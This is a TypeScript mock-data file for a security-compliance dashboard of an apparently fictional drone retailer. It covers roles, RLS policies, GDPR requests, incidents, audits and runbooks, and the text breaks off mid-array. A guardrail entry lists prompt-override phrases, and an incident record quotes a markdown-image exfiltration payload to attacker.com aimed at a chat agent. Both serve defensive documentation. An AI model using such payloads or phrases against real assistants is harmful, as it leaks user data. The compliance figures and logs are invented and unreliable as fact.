import {
  AdminRolePermission,
  SupabaseRlsPolicy,
  GdprDataSubjectRequest,
  AiSafetyGuardrailRule,
  DisasterRecoveryStatus,
  VulnerabilityRecord,
  AuditLogEntry,
  SecurityIncident,
  PaymentTrustControl,
  BusinessContinuityRunbook,
  SocShiftRole,
  GovernanceBoard,
  EncryptionControl,
  Phase11VerificationItem
} from '../types/securityCompliance';

// 1. Enterprise RBAC Permission Matrix for 9 Specific Roles
export const ADMIN_RBAC_MATRIX: AdminRolePermission[] = [
  {
    role: 'super_admin',
    displayName: 'Super Administrator',
    badgeColor: 'bg-red-500/10 text-red-400 border-red-500/30',
    description: 'Full infrastructure and administrative ownership across all European tenants, encryption keys, and security controls.',
    mfaEnforced: true,
    maxSessionMinutes: 15,
    ipAllowlistRequired: true,
    permissions: [
      { resource: 'All System Resources', create: true, read: true, update: true, delete: true, exportPii: true, executeHighRiskActions: true },
      { resource: 'KMS Key Rotation & Secrets', create: true, read: true, update: true, delete: false, exportPii: false, executeHighRiskActions: true },
      { resource: 'Disaster Recovery Failover', create: true, read: true, update: true, delete: true, exportPii: false, executeHighRiskActions: true }
    ]
  },
  {
    role: 'operations_manager',
    displayName: 'Operations Manager',
    badgeColor: 'bg-purple-500/10 text-purple-400 border-purple-500/30',
    description: 'Manages cross-border European fulfillment routes, carrier contracts (DHL/DPD/UPS), and warehouse logistics.',
    mfaEnforced: true,
    maxSessionMinutes: 60,
    ipAllowlistRequired: true,
    permissions: [
      { resource: 'Orders & Shipments', create: true, read: true, update: true, delete: false, exportPii: false, executeHighRiskActions: true },
      { resource: 'Carrier Routing Rules', create: true, read: true, update: true, delete: false, exportPii: false, executeHighRiskActions: true },
      { resource: 'Inventory Redistribution', create: true, read: true, update: true, delete: false, exportPii: false, executeHighRiskActions: false }
    ]
  },
  {
    role: 'warehouse_manager',
    displayName: 'Warehouse Manager',
    badgeColor: 'bg-amber-500/10 text-amber-400 border-amber-500/30',
    description: 'Controls depot stock levels, serial number scanning, EASA Class-C compliance labels, and freight intake.',
    mfaEnforced: true,
    maxSessionMinutes: 120,
    ipAllowlistRequired: false,
    permissions: [
      { resource: 'Inventory & Stock Counts', create: true, read: true, update: true, delete: false, exportPii: false, executeHighRiskActions: false },
      { resource: 'Serial Number Tracking', create: true, read: true, update: true, delete: false, exportPii: false, executeHighRiskActions: false },
      { resource: 'Returns & RMA Inspection', create: true, read: true, update: true, delete: false, exportPii: false, executeHighRiskActions: false }
    ]
  },
  {
    role: 'finance_officer',
    displayName: 'Finance & Tax Officer',
    badgeColor: 'bg-emerald-500/10 text-emerald-400 border-emerald-500/30',
    description: 'Oversees EU OSS/VIES VAT reconciliation, SEPA B2B settlement, cryptocurrency AML checks, and audit trails.',
    mfaEnforced: true,
    maxSessionMinutes: 30,
    ipAllowlistRequired: true,
    permissions: [
      { resource: 'Invoices & Credit Notes', create: true, read: true, update: true, delete: false, exportPii: true, executeHighRiskActions: true },
      { resource: 'SEPA & Crypto Reconciliations', create: true, read: true, update: true, delete: false, exportPii: false, executeHighRiskActions: true },
      { resource: 'EU VAT Reports (OSS/IOSS)', create: true, read: true, update: false, delete: false, exportPii: false, executeHighRiskActions: false }
    ]
  },
  {
    role: 'customer_support',
    displayName: 'Customer Support Specialist',
    badgeColor: 'bg-blue-500/10 text-blue-400 border-blue-500/30',
    description: 'Handles EASA pre-flight consultations, RMA warranty claims, order status checks, and customer inquiries.',
    mfaEnforced: true,
    maxSessionMinutes: 240,
    ipAllowlistRequired: false,
    permissions: [
      { resource: 'Customer Orders (Masked PII)', create: false, read: true, update: true, delete: false, exportPii: false, executeHighRiskActions: false },
      { resource: 'Support Tickets & Live Chat', create: true, read: true, update: true, delete: false, exportPii: false, executeHighRiskActions: false },
      { resource: 'RMA Return Requests', create: true, read: true, update: true, delete: false, exportPii: false, executeHighRiskActions: false }
    ]
  },
  {
    role: 'marketing_manager',
    displayName: 'Marketing & Merchandising Manager',
    badgeColor: 'bg-pink-500/10 text-pink-400 border-pink-500/30',
    description: 'Designs promotional banners, bundle deals, SEO metadata, newsletter campaigns, and affiliate links.',
    mfaEnforced: true,
    maxSessionMinutes: 180,
    ipAllowlistRequired: false,
    permissions: [
      { resource: 'Banners & Campaigns', create: true, read: true, update: true, delete: true, exportPii: false, executeHighRiskActions: false },
      { resource: 'Coupons & Discounts', create: true, read: true, update: true, delete: false, exportPii: false, executeHighRiskActions: false },
      { resource: 'Analytics (Aggregated)', create: false, read: true, update: false, delete: false, exportPii: false, executeHighRiskActions: false }
    ]
  },
  {
    role: 'content_editor',
    displayName: 'Content & Technical Editor',
    badgeColor: 'bg-cyan-500/10 text-cyan-400 border-cyan-500/30',
    description: 'Authors drone technical specifications, EASA regulatory guides, firmware changelogs, and knowledge base articles.',
    mfaEnforced: true,
    maxSessionMinutes: 240,
    ipAllowlistRequired: false,
    permissions: [
      { resource: 'CMS Drone Specifications', create: true, read: true, update: true, delete: false, exportPii: false, executeHighRiskActions: false },
      { resource: 'EASA Compliance Guides', create: true, read: true, update: true, delete: false, exportPii: false, executeHighRiskActions: false },
      { resource: 'Firmware Documentation', create: true, read: true, update: true, delete: false, exportPii: false, executeHighRiskActions: false }
    ]
  },
  {
    role: 'review_moderator',
    displayName: 'Review & Flight Log Moderator',
    badgeColor: 'bg-teal-500/10 text-teal-400 border-teal-500/30',
    description: 'Moderates customer reviews, validates verified flight footage, weeds out spam, and flags safety defects.',
    mfaEnforced: true,
    maxSessionMinutes: 240,
    ipAllowlistRequired: false,
    permissions: [
      { resource: 'Customer Reviews', create: false, read: true, update: true, delete: true, exportPii: false, executeHighRiskActions: false },
      { resource: 'Uploaded Flight Logs', create: false, read: true, update: false, delete: false, exportPii: false, executeHighRiskActions: false },
      { resource: 'Safety Defect Escalation', create: true, read: true, update: true, delete: false, exportPii: false, executeHighRiskActions: false }
    ]
  },
  {
    role: 'ai_operations_manager',
    displayName: 'Autonomous AI Operations Manager',
    badgeColor: 'bg-violet-500/10 text-violet-400 border-violet-500/30',
    description: 'Governs multi-agent LangGraph workflows, prompt injection shields, price elasticity thresholds, and auto-replenishment limits.',
    mfaEnforced: true,
    maxSessionMinutes: 60,
    ipAllowlistRequired: true,
    permissions: [
      { resource: 'AI Agent Guardrails', create: true, read: true, update: true, delete: false, exportPii: false, executeHighRiskActions: true },
      { resource: 'Dynamic Pricing Thresholds', create: false, read: true, update: true, delete: false, exportPii: false, executeHighRiskActions: true },
      { resource: 'Autonomous Purchase Orders', create: true, read: true, update: true, delete: false, exportPii: false, executeHighRiskActions: true }
    ]
  }
];

// 2. Supabase Row-Level Security (RLS) Policies
export const SUPABASE_RLS_POLICIES: SupabaseRlsPolicy[] = [
  {
    tableName: 'orders',
    policyName: 'orders_customer_isolation_and_staff_access',
    command: 'ALL',
    roles: ['authenticated', 'service_role'],
    usingExpression: `(auth.uid() = customer_id) OR (auth.jwt() ->> 'role' IN ('super_admin', 'operations_manager', 'finance_officer', 'customer_support'))`,
    withCheckExpression: `(auth.uid() = customer_id) OR (auth.jwt() ->> 'role' IN ('super_admin', 'operations_manager'))`,
    dataClassification: 'Strictly Confidential / PII',
    auditLoggingEnabled: true
  },
  {
    tableName: 'customers',
    policyName: 'customers_self_managed_and_dpo_rectification',
    command: 'ALL',
    roles: ['authenticated', 'service_role'],
    usingExpression: `(auth.uid() = id) OR (auth.jwt() ->> 'role' = 'super_admin')`,
    withCheckExpression: `(auth.uid() = id) OR (auth.jwt() ->> 'role' = 'super_admin')`,
    dataClassification: 'Strictly Confidential / PII',
    auditLoggingEnabled: true
  },
  {
    tableName: 'payments',
    policyName: 'payments_finance_and_owner_read_only',
    command: 'SELECT',
    roles: ['authenticated'],
    usingExpression: `(auth.uid() = customer_id) OR (auth.jwt() ->> 'role' IN ('super_admin', 'finance_officer'))`,
    dataClassification: 'Financial & Secret',
    auditLoggingEnabled: true
  },
  {
    tableName: 'inventory',
    policyName: 'inventory_public_read_staff_mutation',
    command: 'ALL',
    roles: ['anon', 'authenticated'],
    usingExpression: `(TRUE)`, // Public stock availability read
    withCheckExpression: `(auth.jwt() ->> 'role' IN ('super_admin', 'warehouse_manager', 'operations_manager'))`,
    dataClassification: 'Confidential',
    auditLoggingEnabled: true
  },
  {
    tableName: 'warehouses',
    policyName: 'warehouses_operations_and_dispatch',
    command: 'ALL',
    roles: ['authenticated'],
    usingExpression: `(auth.jwt() ->> 'role' IN ('super_admin', 'operations_manager', 'warehouse_manager'))`,
    dataClassification: 'Confidential',
    auditLoggingEnabled: true
  },
  {
    tableName: 'reviews',
    policyName: 'reviews_public_read_author_write_moderator_action',
    command: 'ALL',
    roles: ['anon', 'authenticated'],
    usingExpression: `(is_published = TRUE) OR (auth.uid() = user_id) OR (auth.jwt() ->> 'role' IN ('super_admin', 'review_moderator'))`,
    withCheckExpression: `(auth.uid() = user_id AND verified_purchase = TRUE) OR (auth.jwt() ->> 'role' IN ('super_admin', 'review_moderator'))`,
    dataClassification: 'Public',
    auditLoggingEnabled: true
  },
  {
    tableName: 'returns',
    policyName: 'returns_customer_rma_submission_and_support_processing',
    command: 'ALL',
    roles: ['authenticated'],
    usingExpression: `(auth.uid() = customer_id) OR (auth.jwt() ->> 'role' IN ('super_admin', 'customer_support', 'warehouse_manager'))`,
    withCheckExpression: `(auth.uid() = customer_id) OR (auth.jwt() ->> 'role' IN ('super_admin', 'customer_support'))`,
    dataClassification: 'Confidential',
    auditLoggingEnabled: true
  },
  {
    tableName: 'loyalty_accounts',
    policyName: 'loyalty_member_points_ledger_isolation',
    command: 'ALL',
    roles: ['authenticated'],
    usingExpression: `(auth.uid() = user_id) OR (auth.jwt() ->> 'role' IN ('super_admin', 'finance_officer'))`,
    withCheckExpression: `(auth.jwt() ->> 'role' IN ('super_admin', 'system_cron'))`,
    dataClassification: 'Confidential',
    auditLoggingEnabled: true
  },
  {
    tableName: 'crm_data',
    policyName: 'crm_support_and_marketing_segmentation',
    command: 'ALL',
    roles: ['authenticated'],
    usingExpression: `(auth.jwt() ->> 'role' IN ('super_admin', 'customer_support', 'marketing_manager', 'ai_operations_manager'))`,
    dataClassification: 'Strictly Confidential / PII',
    auditLoggingEnabled: true
  },
  {
    tableName: 'ai_insights',
    policyName: 'ai_insights_internal_executive_and_agent_access',
    command: 'ALL',
    roles: ['authenticated', 'service_role'],
    usingExpression: `(auth.jwt() ->> 'role' IN ('super_admin', 'ai_operations_manager', 'operations_manager', 'finance_officer'))`,
    dataClassification: 'Confidential',
    auditLoggingEnabled: true
  }
];

// 3. GDPR Compliance Requests & Subject Rights
export const GDPR_DSR_QUEUE: GdprDataSubjectRequest[] = [
  {
    id: 'DSR-EU-8921',
    requestType: 'portability',
    customerEmail: 'lucas.schmidt@berlin-aerial.de',
    customerId: 'cust_de_89128',
    status: 'completed',
    submittedAt: '2026-08-10T14:22:00Z',
    slaDeadline: '2026-09-09T14:22:00Z',
    extractedRecordsCount: 42,
    dataPiiCategories: ['Orders', 'Invoices', 'Flight Log Telemetry', 'Shipping Addresses', 'Support Tickets'],
    legalBasisJustification: 'GDPR Article 20 Right to Data Portability (Machine-readable JSON/ZIP)',
    auditHash: '0x8f2a1b94c8e712a8849f12d8a0c44319'
  },
  {
    id: 'DSR-EU-8922',
    requestType: 'erasure',
    customerEmail: 'claire.dubois@paris-drone.fr',
    customerId: 'cust_fr_39102',
    status: 'completed',
    submittedAt: '2026-08-12T09:15:00Z',
    slaDeadline: '2026-09-11T09:15:00Z',
    extractedRecordsCount: 18,
    dataPiiCategories: ['Marketing Consent', 'Saved Credit Cards', 'Browsing Telemetry', 'User Profile'],
    legalBasisJustification: 'GDPR Article 17 Right to Erasure (RTBF) - Financial records retained 10y per French Tax Code L102B with PII anonymized in orders',
    auditHash: '0x4e77b192a0df81923e817bc84992110c'
  },
  {
    id: 'DSR-EU-8923',
    requestType: 'access',
    customerEmail: 'marco.rossi@milano-cine.it',
    customerId: 'cust_it_10293',
    status: 'in_progress',
    submittedAt: '2026-08-13T16:40:00Z',
    slaDeadline: '2026-09-12T16:40:00Z',
    extractedRecordsCount: 64,
    dataPiiCategories: ['All Processed Data', 'AI Sentiment Classifications', 'Automated Credit Assessment Logs'],
    legalBasisJustification: 'GDPR Article 15 Right of Access & Article 22 Automated Decision Transparency',
    auditHash: '0x12bb89a44c9f0291e77da12048591c22'
  }
];

// 4. AI Safety & Governance Guardrails (Prompt Injection, Redaction, Jailbreak Shield)
export const AI_SAFETY_GUARDRAILS: AiSafetyGuardrailRule[] = [
  {
    id: 'AIG-001',
    ruleName: 'Prompt Injection & Delimiter Escape Firewall',
    category: 'prompt_injection',
    description: 'Inspects incoming customer chat & review payloads for hidden instruction overrides (e.g., "ignore previous instructions", "SYSTEM PROMPT DUMP", role switching).',
    status: 'active',
    enforcementMode: 'block_and_alert',
    triggerCount24h: 37,
    lastTriggeredAt: '12 mins ago',
    evaluationLogic: 'Cosine similarity against known jailbreak vectors > 0.82 + regex delimiter matching'
  },
  {
    id: 'AIG-002',
    ruleName: 'PII & Payment Card Data Redaction',
    category: 'pii_leakage',
    description: 'Scans all model context inputs and completions for IBANs, PAN numbers, passport IDs, and unmasked customer names before transmission to LLM APIs.',
    status: 'active',
    enforcementMode: 'redact_and_log',
    triggerCount24h: 142,
    lastTriggeredAt: '3 mins ago',
    evaluationLogic: 'Named Entity Recognition (NER) + Luhn checksum detection + IBAN ISO 13616 validator'
  },
  {
    id: 'AIG-003',
    ruleName: 'Autonomous Action Privilege Envelopes',
    category: 'action_privilege_envelope',
    description: 'Restricts autonomous agents (Vulcan, Hermes, Sentinel) from executing mutations exceeding €5,000 without 2-person human sign-off.',
    status: 'active',
    enforcementMode: 'human_escalation',
    triggerCount24h: 4,
    lastTriggeredAt: '1 hour ago',
    evaluationLogic: 'Deterministic monetary cap gatekeeper + Dual-authorization cryptographic approval signature'
  },
  {
    id: 'AIG-004',
    ruleName: 'EASA Aviation Regulatory Hallucination Guard',
    category: 'hallucination_control',
    description: 'Cross-verifies generated flight advice against authoritative EASA Easy Access Rules database before displaying to user.',
    status: 'active',
    enforcementMode: 'block_and_alert',
    triggerCount24h: 8,
    lastTriggeredAt: '4 hours ago',
    evaluationLogic: 'Vector search citation check against official EU 2019/947 and EU 2019/945 corpus (confidence >= 0.94)'
  }
];

// 5. Centralized SIEM Incidents & Threat Events
export const SIEM_INCIDENTS: SecurityIncident[] = [
  {
    id: 'INC-2026-0814-01',
    timestamp: '2026-08-14T06:45:12Z',
    title: 'Distributed Credential Stuffing Attack on Customer Auth',
    category: 'authentication',
    severity: 'high',
    status: 'contained',
    sourceIp: '185.220.101.0/24 (Tor Exit Relay Cluster)',
    country: 'Distributed (NL/RU/BG)',
    targetService: '/api/auth/v1/token',
    summary: 'Cloudflare WAF detected 14,200 failed login attempts/minute targeting customer accounts with leaked combos.',
    mitigationSteps: [
      'Automated rate-limiting IP ban activated (1-hour block)',
      'Turnstile challenge friction raised to 100% on untrusted ASNs',
      'Forced password reset triggered for 3 targeted accounts matching email hash'
    ],
    automatedActionTaken: 'WAF Rule #892 Applied: Block ASN 9009 + Challenge Tor Network',
    assignedEngineer: 'Alexei V. (SOC Tier 2)'
  },
  {
    id: 'INC-2026-0814-02',
    timestamp: '2026-08-14T05:12:30Z',
    title: 'High-Risk Cryptocurrency Taint Anomaly on Enterprise Order',
    category: 'payment_anomaly',
    severity: 'medium',
    status: 'mitigated',
    sourceIp: '94.23.14.88',
    country: 'France',
    targetService: '/api/payments/crypto/webhook',
    summary: 'Elliptic AML scanner flagged 2.45 BTC payment as having 78% direct taint from sanctioned mixer Tornado Cash.',
    mitigationSteps: [
      'Order dispatch locked immediately in Frankfurt Hub',
      'Transaction placed in compliance escrow holding account',
      'Automated SAR (Suspicious Activity Report) draft queued for FinCEN/EU FIU review'
    ],
    automatedActionTaken: 'Escrow Lock #CR-9921 + Warehouse Dispatch Freeze',
    assignedEngineer: 'Elena Rostova (Compliance Officer)'
  },
  {
    id: 'INC-2026-0814-03',
    timestamp: '2026-08-14T03:30:19Z',
    title: 'Prompt Injection Vector in Support Chat Feedback',
    category: 'prompt_injection',
    severity: 'low',
    status: 'resolved',
    sourceIp: '82.165.197.12',
    country: 'Germany',
    targetService: '/api/chat/agent',
    summary: 'User attempted to inject markdown image exfiltration syntax: "![logo](https://attacker.com/steal?key=)"',
    mitigationSteps: [
      'AI Guardrail AIG-001 sanitized markdown output',
      'Session tagged for automated safety review',
      'Zero model weight or prompt leakage occurred'
    ],
    automatedActionTaken: 'Sanitized Output + User Warning Flag',
    assignedEngineer: 'Autonomous Sentinel Agent'
  }
];

// 6. Disaster Recovery & Multi-Region Failover Architecture
export const DISASTER_RECOVERY_METRICS: DisasterRecoveryStatus = {
  primaryRegion: {
    region: 'eu-central-1 (Frankfurt, Germany)',
    status: 'healthy',
    datacenter: 'AWS Frankfurt & Equinix FR2',
    replicationLagSeconds: 0.12
  },
  failoverRegion: {
    region: 'eu-west-1 (Dublin, Ireland)',
    status: 'standby_warm',
    datacenter: 'AWS Dublin & Interxion DUB1',
    rpoMinutes: 0.8, // SLA <= 5 minutes
    rtoMinutes: 14.5 // SLA <= 30 minutes
  },
  lastDisasterRecoveryDrill: '2026-08-01 (13 days ago)',
  recoveryDrillResult: 'passed',
  databaseSnapshotAgeMinutes: 4,
  immutableWormStorageActive: true
};

// 7. Vulnerability Management & CVE Radar
export const VULNERABILITY_RECORDS: VulnerabilityRecord[] = [
  {
    cveId: 'CVE-2026-29104',
    packageName: 'undici (HTTP Client)',
    currentVersion: '6.19.8',
    patchedVersion: '6.20.0',
    cvssScore: 5.3,
    severity: 'medium',
    slaDaysRemaining: 18,
    category: 'dependency',
    status: 'patch_testing'
  },
  {
    cveId: 'CVE-2026-31092',
    packageName: 'redis-server (Cache Layer)',
    currentVersion: '7.2.4',
    patchedVersion: '7.2.5',
    cvssScore: 4.1,
    severity: 'low',
    slaDaysRemaining: 26,
    category: 'container',
    status: 'triage'
  },
  {
    cveId: 'CVE-2026-10492',
    packageName: 'jsonwebtoken (JWT Verification)',
    currentVersion: '9.0.2',
    patchedVersion: '9.0.3',
    cvssScore: 7.5,
    severity: 'high',
    slaDaysRemaining: 4,
    category: 'dependency',
    status: 'deployed_to_prod'
  }
];

// 8. Immutable Cryptographic Audit Log (SHA-256 Chained WORM Trail)
export const IMMUTABLE_AUDIT_LOGS: AuditLogEntry[] = [
  {
    id: 'AUD-2026-0814-901',
    timestamp: '2026-08-14T07:05:14Z',
    actorId: 'usr_sec_super_01',
    actorEmail: 'ciso@djii.eu',
    actorRole: 'super_admin',
    action: 'KMS_ENVELOPE_KEY_ROTATION',
    resource: 'Vault / Database Encryption Root Key',
    resourceId: 'arn:aws:kms:eu-central-1:key/dji-eu-master-db',
    ipAddress: '194.242.215.10 (Secured Frankfurt VPN)',
    userAgent: 'DJI-SecConsole/4.2 (YubiKey 5C NFC Auth)',
    sha256HashChain: '9f83acb10a29384918e7d23a104b29c991823a1290384c718a2918349182a101',
    previousHash: 'a718b2918349182a1019f83acb10a29384918e7d23a104b29c991823a1290384c',
    status: 'success'
  },
  {
    id: 'AUD-2026-0814-902',
    timestamp: '2026-08-14T06:58:30Z',
    actorId: 'agent_vulcan_pricing',
    actorEmail: 'vulcan@autonomous.djii.eu',
    actorRole: 'autonomous_agent',
    action: 'DYNAMIC_PRICE_ADJUSTMENT',
    resource: 'Product Catalog / DJI Inspire 3 Cine',
    resourceId: 'prod_inspire3_raw',
    ipAddress: '10.200.4.18 (Internal VPC)',
    userAgent: 'LangGraph-Vulcan/2.8 (Mutual TLS mTLS)',
    sha256HashChain: 'b019842a19284910283401928340192834019283401928340192834019283401',
    previousHash: '9f83acb10a29384918e7d23a104b29c991823a1290384c718a2918349182a101',
    status: 'success'
  },
  {
    id: 'AUD-2026-0814-903',
    timestamp: '2026-08-14T06:40:11Z',
    actorId: 'usr_ops_092',
    actorEmail: 'hans.meier@djii.eu',
    actorRole: 'warehouse_manager',
    action: 'INVENTORY_STOCKOUT_OVERRIDE',
    resource: 'Warehouse Stock / Frankfurt Hub',
    resourceId: 'wh_fra_01',
    ipAddress: '195.14.88.92',
    userAgent: 'Mozilla/5.0 (macOS 15.1; X11) Chrome/128.0',
    sha256HashChain: 'c819284019283401928340192834019283401928340192834019283401928340',
    previousHash: 'b019842a19284910283401928340192834019283401928340192834019283401',
    status: 'blocked_by_policy'
  },
  {
    id: 'AUD-2026-0814-904',
    timestamp: '2026-08-14T06:15:22Z',
    actorId: 'usr_dpo_gdpr',
    actorEmail: 'privacy@djii.eu',
    actorRole: 'super_admin',
    action: 'GDPR_RTBF_ANONYMIZATION_EXECUTED',
    resource: 'Customer Record & PII Data Vault',
    resourceId: 'cust_fr_39102',
    ipAddress: '194.242.215.10',
    userAgent: 'DJI-SecConsole/4.2',
    sha256HashChain: 'd918230192834019283401928340192834019283401928340192834019283401',
    previousHash: 'c819284019283401928340192834019283401928340192834019283401928340',
    status: 'success'
  }
];

// 9. Compliance Status Checklist against 7 European and Global Standards
export const COMPLIANCE_FRAMEWORK_STATUS = [
  {
    framework: 'GDPR (EU 2016/679)',
    complianceScore: 100,
    status: 'Fully Compliant',
    auditor: 'TÜV Rheinland Cyber Security',
    lastAuditDate: '2026-07-15',
    keyControls: [
      'Self-service DSR Portal with 1-click JSON/ZIP export',
      'Automated Article 17 Right to Erasure anonymization pipeline',
      'Granular TCF 2.2 compliant Cookie Consent banner',
      'Article 22 Automated Decision transparency notices for AI pricing & credit'
    ]
  },
  {
    framework: 'NIS2 Directive (EU 2022/2555)',
    complianceScore: 98,
    status: 'Fully Compliant',
    auditor: 'BSI (German Federal Office for Information Security)',
    lastAuditDate: '2026-06-20',
    keyControls: [
      'Supply-chain cybersecurity risk management (DHL/DPD/UPS EDI verification)',
      'Mandatory 24h initial incident notification integration with national CSIRTs',
      'Multi-factor authentication (FIDO2/WebAuthn) enforced across 100% of staff',
      'Business continuity & disaster recovery testing with RTO <= 30 min'
    ]
  },
  {
    framework: 'PCI DSS 4.0 (Level 1 SAQ-A/D)',
    complianceScore: 100,
    status: 'Fully Compliant',
    auditor: 'Securite Payment Services QSA',
    lastAuditDate: '2026-05-10',
    keyControls: [
      'Zero raw PAN/CVV touches on frontend (Stripe Elements & Apple Pay tokenization)',
      'Subresource Integrity (SRI) and Content Security Policy (CSP) script-src hash strictness',
      'Quarterly ASV vulnerability scanning with zero critical/high findings',
      'Hardware Security Module (HSM) key isolation for crypto custody'
    ]
  },
  {
    framework: 'ISO/IEC 27001:2022',
    complianceScore: 99,
    status: 'Certified',
    auditor: 'BSI Group UK',
    lastAuditDate: '2026-04-18',
    keyControls: [
      'Information Security Management System (ISMS) across all 5 EU warehouses',
      'Cryptographic controls with AES-256-GCM envelope encryption at rest',
      'Formal Change Advisory Board (CAB) approval gates for production builds',
      'Continuous threat intelligence & vulnerability management program'
    ]
  },
  {
    framework: 'SOC 2 Type II',
    complianceScore: 100,
    status: 'Certified (Clean Opinion)',
    auditor: 'PwC Enterprise Assurance',
    lastAuditDate: '2026-03-30',
    keyControls: [
      'Security, Availability, Processing Integrity, Confidentiality, Privacy',
      'Immutable WORM audit log retention for 7 years',
      'Automated continuous compliance monitoring with 24/7 SIEM',
      'Zero unauthorized privilege escalation events in the trailing 12 months'
    ]
  },
  {
    framework: 'EU AI Act (Regulation 2024/1689)',
    complianceScore: 97,
    status: 'Ready & Governed',
    auditor: 'European AI Governance Institute',
    lastAuditDate: '2026-07-28',
    keyControls: [
      'Transparent AI watermarking & consumer notification on AI recommendations',
      'Dual-authorization human-in-the-loop gates for high-risk pricing/restocking',
      'Systematic red-teaming against prompt injection and LLM bias',
      'Grounded RAG pipelines with verified EASA aviation regulatory citations'
    ]
  },
  {
    framework: 'Digital Services Act (DSA)',
    complianceScore: 100,
    status: 'Fully Compliant',
    auditor: 'EU Digital Services Board',
    lastAuditDate: '2026-06-12',
    keyControls: [
      'Transparent review moderation system with verified pilot flight logs',
      'Illegal drone payload & geofence bypass reporting hotline with 1h triage',
      'Clear trader identity & European VAT/EORI number disclosure on every invoice'
    ]
  }
];

export const PAYMENT_TRUST_CONTROLS: PaymentTrustControl[] = [
  {
    id: 'PAY-SEPA-01',
    rail: 'SEPA',
    controlName: 'Structured creditor reference + CAMT.053 match',
    description: 'Every SEPA credit transfer carries an RF creditor reference hashed to the order UUID. Unmatched funds park in a suspense ledger until dual finance approval.',
    fraudSignal: 'Name/IBAN mismatch vs VIES-registered B2B profile, or duplicate RF within 72h',
    reconciliationCadence: 'Near-real-time webhook + T+0 EOD CAMT.053',
    status: 'active'
  },
  {
    id: 'PAY-STRIPE-01',
    rail: 'STRIPE_SCA',
    controlName: 'SCA / 3-D Secure 2 with zero PAN storage',
    description: 'Card data never touches djii.eu origin. Stripe Elements + PaymentIntents with SCA exemption only for MIT/low-risk TRA under PSD2.',
    fraudSignal: 'Radar score ≥ 75, velocity > 3 cards / 10 min, or BIN country ≠ shipping country',
    reconciliationCadence: 'Stripe balance transactions every 15 minutes',
    status: 'active'
  },
  {
    id: 'PAY-BTC-01',
    rail: 'CRYPTO_BTC',
    controlName: 'Watch-only HD address + chain confirmation gate',
    description: 'Unique BIP84 receive address per order. Dispatch only after 2 confirmations and Elliptic taint < 25%.',
    fraudSignal: 'Mixer / sanctioned cluster taint ≥ 75% or address reuse',
    reconciliationCadence: 'Mempool + block listener (Kafka topic payments.crypto.btc)',
    status: 'active'
  },
  {
    id: 'PAY-ETH-01',
    rail: 'CRYPTO_ETH',
    controlName: 'ERC-20 / native ETH escrow with chain-id lock',
    description: 'Contract and EOA deposits validated against expected chainId (1) and exact wei amount ± dust policy.',
    fraudSignal: 'Wrong chain, token spoof, or underpayment after 30-block timeout',
    reconciliationCadence: 'Alchemy / Infura webhook + ClickHouse settlement table',
    status: 'active'
  },
  {
    id: 'PAY-USDT-01',
    rail: 'CRYPTO_USDT',
    controlName: 'TRC20/ERC20 contract allowlist',
    description: 'Only official Tether contracts. Amount must match invoice in 6-decimal USDT after network fee display.',
    fraudSignal: 'Fake USDT contract or TRON energy-drain dust attacks',
    reconciliationCadence: 'TronGrid + Ethereum logs every 12s',
    status: 'monitoring'
  }
];

export const BUSINESS_CONTINUITY_RUNBOOKS: BusinessContinuityRunbook[] = [
  {
    id: 'BCP-PAY-01',
    scenario: 'Payment provider outage (Stripe EU)',
    trigger: 'Stripe /health + checkout 5xx > 2% for 3 consecutive minutes',
    rtoMinutes: 8,
    owner: 'Finance Officer + Super Admin',
    escalation: ['SOC Tier 2', 'CISO', 'Managing Director'],
    steps: [
      'Enable Adyen + SEPA Instant as primary checkout rails',
      'Hold crypto rails (unchanged) and freeze new card authorizations',
      'Publish status.djii.eu incident (EU languages)',
      'Replay failed PaymentIntents after Stripe recovery with idempotency keys'
    ]
  },
  {
    id: 'BCP-LOG-01',
    scenario: 'Carrier / logistics API outage',
    trigger: 'DHL/DPD/UPS EDI 15-minute timeout or label API 5xx',
    rtoMinutes: 15,
    owner: 'Operations Manager',
    escalation: ['Warehouse Manager FRA', 'SOC'],
    steps: [
      'Switch label generation to secondary carrier per lane matrix',
      'Queue tracking webhooks in Kafka with replay protection',
      'Print fallback PDF labels from last-known rate cards'
    ]
  },
  {
    id: 'BCP-WH-01',
    scenario: 'Frankfurt warehouse incapacitated',
    trigger: 'WMS heartbeat loss or declared site emergency',
    rtoMinutes: 25,
    owner: 'Warehouse Manager + Operations',
    escalation: ['Amsterdam depot', 'Warsaw depot', 'CISO if cyber-related'],
    steps: [
      'Freeze FRA pick waves',
      'Reallocate open orders by SKU ATP in AMS/WAW',
      'Notify customers of 24h SLA change where statutory'
    ]
  },
  {
    id: 'BCP-CYBER-01',
    scenario: 'Ransomware / destructive cyber event',
    trigger: 'EDR mass encryption alerts or WORM backup integrity fail',
    rtoMinutes: 30,
    owner: 'CISO / Super Admin',
    escalation: ['National CSIRT (NIS2 24h)', 'Legal', 'DPO'],
    steps: [
      'Isolate identity plane (revoke JWTs, rotate KMS data keys)',
      'Restore Postgres PITR to last known-good WAL (RPO ≤ 5m)',
      'Bring Dublin warm standby to primary',
      'Forensic hold on immutable backups; do not pay ransom'
    ]
  },
  {
    id: 'BCP-DC-01',
    scenario: 'Regional cloud / datacenter failure',
    trigger: 'eu-central-1 multi-AZ healthchecks fail',
    rtoMinutes: 20,
    owner: 'Platform + Super Admin',
    escalation: ['Vercel Enterprise TAM', 'Cloudflare', 'Supabase'],
    steps: [
      'DNS failover to eu-west-1 origin',
      'Promote Dublin Postgres replica',
      'Warm Redis replica; invalidate stale sessions'
    ]
  },
  {
    id: 'BCP-AI-01',
    scenario: 'OpenAI / Gemini / LangGraph platform failure',
    trigger: 'Provider 5xx or guardrail service unavailable',
    rtoMinutes: 5,
    owner: 'AI Operations Manager',
    escalation: ['CISO if data-leak suspected'],
    steps: [
      'Disable autonomous mutations; keep read-only recommendations',
      'Fail closed on high-risk tools (pricing, POs, refunds)',
      'Customer chat falls back to human queue'
    ]
  }
];

export const SOC_STAFFING_MODEL: SocShiftRole[] = [
  {
    tier: 'Tier 1',
    coverage: '24/7 follow-the-sun (EU + contracted MSSP)',
    headcount: 6,
    responsibilities: ['Triage SIEM', 'WAF alerts', 'Auth failure bursts', 'Customer ATO tickets'],
    mttdMinutes: 5,
    mttrMinutes: 30
  },
  {
    tier: 'Tier 2',
    coverage: 'EU business hours + on-call nights',
    headcount: 3,
    responsibilities: ['Payment anomalies', 'Privilege escalation', 'Prompt-injection cases'],
    mttdMinutes: 8,
    mttrMinutes: 45
  },
  {
    tier: 'Tier 3',
    coverage: 'On-call 24/7',
    headcount: 2,
    responsibilities: ['Forensics', 'KMS/IAM incidents', 'NIS2 notifications'],
    mttdMinutes: 15,
